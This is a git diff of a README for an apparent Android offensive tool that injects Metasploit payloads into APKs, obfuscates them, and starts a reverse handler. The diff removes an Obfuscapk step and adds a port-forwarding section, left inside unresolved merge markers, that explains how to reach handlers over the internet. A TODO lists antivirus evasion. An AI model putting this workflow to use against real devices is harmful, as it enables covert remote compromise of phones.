@@ -88,7 +88,6 @@ cyrus/
    -  Inject Payload
    -  Obfuscate Payload (smali rename)
    -  Rebuild APK (Unsigned)
-   -  Obfuscate APK with Obfuscapk
    -  Launch Metasploit
    -  Cleanup
 4. Sign `output/unsigned.apk` and install on the device.
@@ -121,13 +120,7 @@ cyrus/
 ### 5) Rebuild APK (Unsigned)
 - Rebuilds to `output/unsigned.apk`. You must sign this before install.
 
-### 6) Obfuscate APK with Obfuscapk
-- Requires a local Obfuscapk setup (pre-configured under `~/Desktop/github-projects/Obfuscapk`).
-- Wraps the Obfuscapk CLI in its Python venv and runs chosen obfuscators (e.g., `ClassRename,MethodRename,FieldRename,Rebuild`).
-- Defaults to using `output/unsigned.apk` as input; otherwise, you can pick any APK.
-- Produces `output/obfuscated.apk` and verifies signature/alignment.
-
-### 7) Launch Metasploit
+### 6) Launch Metasploit
 - Starts a handler with your parameters. Equivalent manual session:
 
 ```
@@ -138,7 +131,7 @@ set LPORT 4444
 exploit -j
 ```
 
-### 8) Cleanup
+### 7) Cleanup
 - Resets `output/` to a clean baseline.
 
 ## Signing (External)
@@ -223,3 +216,34 @@ You can run Cyrus handlers over the internet (OTA) by forwarding a TCP port from
 - Apktool by iBotPeaches and contributors
 - Metasploit Framework by Rapid7 and the community
 - Android reverse‑engineering community and tooling ecosystem
+<<<<<<< HEAD
+=======
+
+## Remote/OTA Use (Port Forwarding)
+
+You can run Cyrus handlers over the internet (OTA) by forwarding a TCP port from your router to your machine.
+
+- Pick a public endpoint
+  - Use your WAN IP (whatismyip) or a dynamic DNS hostname (e.g., DuckDNS/No-IP).
+- Forward a port on your router
+  - Create a TCP port-forward rule: `WAN:PORT -> LAN:<your-machine-IP>:PORT`.
+  - Prefer a high, unprivileged port (e.g., 44444) to avoid ISP blocks on 25/80/443.
+- Configure Cyrus/Metasploit
+  - Set `LHOST` to your public IP/hostname.
+  - Set `LPORT` to the forwarded port.
+  - Ensure your local firewall allows inbound on `LPORT`.
+- Verify connectivity
+  - From a cellular network or another ISP: `nc -vz <public-host> <LPORT>` or use an external port-check service.
+- NAT loopback
+  - Some routers don’t support hairpin NAT; if testing from the same LAN, use your LAN IP instead of the public hostname.
+- Security & ethics
+  - Only test on devices/APKs you have explicit permission to assess.
+  - Avoid well-known ports, enable rate limits where possible, and monitor for abuse.
+
+
+
+## TODO
+
+- Update antivirus evasion
+- Add reverse HTTP/HTTPS payload options
+>>>>>>> 628a1fb (feat: remove Obfuscapk option from menu; docs: drop Obfuscapk section and renumber steps; clean README merge markers)
